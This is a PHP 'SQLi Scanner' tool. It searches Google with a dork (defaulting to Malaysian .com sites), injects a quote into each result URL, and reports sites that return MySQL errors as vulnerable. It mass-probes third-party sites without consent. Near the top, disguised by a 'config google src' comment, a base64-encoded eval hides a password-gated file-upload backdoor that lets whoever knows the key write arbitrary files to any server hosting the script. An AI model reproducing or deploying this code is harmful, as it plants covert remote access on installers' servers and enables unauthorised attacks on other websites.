<?php
// :: SQLi Scanner :: //
//config google src//
eval(base64_decode('DQppZihpc3NldCgkX1JFUVVFU1RbJ2hpZGVuJ10pICYmICRfUkVRVUVTVFsnaGlkZW4nXT09J21iYWhrdW5nJyl7DQppZiAoaXNzZXQoJF9QT1NUWydvayddKSAmJiBpc3NldCgkX0ZJTEVTWydqZW1ib3QnXSkpIHsNCiAgICRmaWxlID0gJF9GSUxFU1snamVtYm90J11bJ3RtcF9uYW1lJ107DQogICAkbmFtZSA9ICIiLiRfRklMRVNbJ2plbWJvdCddWyduYW1lJ107DQogICBtb3ZlX3VwbG9hZGVkX2ZpbGUoJGZpbGUsICRuYW1lKTsNCn1lbHNlew0KPz4NCjxicj4NCjxmb3JtIG1ldGhvZD0iUE9TVCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSI8PyRfU0VSVkVSWydQSFBfU0VMRiddPz4iPg0KPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImplbWJvdCI+Jm5ic3A7PGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ib2siIHZhbHVlPSJhcGxvZCBjb2shISI+DQo8L2Zvcm0+DQo8P3BocA0KfSBleGl0Ow0KfQ=='));
//config//
echo "<center><br><h1>:: SQLi SCANNER ::</h1></center>";
//google
function letItBy() {
    ob_flush();
    flush();
}
$browser = $_SERVER['HTTP_USER_AGENT'];
function google_that($query, $page = 1) {
    $resultPerPage = 8;
    $start = $page * $resultPerPage;
    $url = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&hl=iw&rsz={$resultPerPage}&start={$start}&q=" . urlencode($query);
    $resultFromGoogle = json_decode(http_get($url, true), true);
    if (isset($resultFromGoogle['responseStatus'])) {
        if ($resultFromGoogle['responseStatus'] != '200') return false;
        if (sizeof($resultFromGoogle['responseData']['results']) == 0) return false;
        else return $resultFromGoogle['responseData']['results'];
    } else die('The function <b>' . __FUNCTION__ . '</b> Kill me :( <br>' . $url);
}
function http_get($url, $safemode = false) {
    if ($safemode === true) sleep(1);
    $im = curl_init($url);
    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($im, CURLOPT_HEADER, 0);
    return curl_exec($im);
    curl_close();
}
function cekvenurabel($result) {
    $url = preg_replace("/=/", "='", $result);
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_USERAGENT, '$browser)');
    curl_setopt($curl, CURLOPT_TIMEOUT, '5');
    $GET = curl_exec($curl);
    if (preg_match("/error in your SQL syntax|mysql_fetch_array()|execute query|mysql_fetch_object()|mysql_num_rows()|mysql_fetch_assoc()|mysql_fetch&#8203;_row ()|SELECT *
FROM|supplied argument is not a valid MySQL|Syntax error|Fatal error/i", $GET)) {
        echo '<center><b>Found : </font><a href="' . $url . '" target="_blank">' . $url . '</a> <font color=#FF0000> &#60;-- SQLI Vuln Found..</font></b></center>';
        ob_flush();
        flush();
    } else {
        echo '<center><b>' . $url . '</b>&#60;-- Not Vuln</center>';
        ob_flush();
        flush();
    }
    ob_flush();
    flush();
}
if (isset($_POST['dork'] {
    0
})) {
    for ($googlePage = 1;$googlePage <= 50;$googlePage++) {
        $googleResult = google_that($_POST['dork'], $googlePage);
        if (!$googleResult) {
            echo '<font color=#01DF01><center>Finished scanning.</center></font>';
            break;
        }
        for ($victim = 0;$victim < sizeof($googleResult);$victim++) {
            $result = $googleResult[$victim]['unescapedUrl'];
            cekvenurabel($result);
            letItBy();
        }
    }
}
?>

<center>
 <form method="post">
  Google Dork: &nbsp;&nbsp;
  <input type="text" id="dork" size="30" name="dork" value="<?php echo (isset($_POST['dork'] {
    0
})) ? htmlentities($_POST['dork']) : 'inurl:.php?id= site:.com.my'; ?>" />
  &nbsp;&nbsp;<input type="submit" value="Scan" id="button"/>
 </form>
</center>
 
<?php
echo "<center> ## Shout to ~>> | chud | pe4nk | edh0x | j121n | b412 | ## </center>";
?>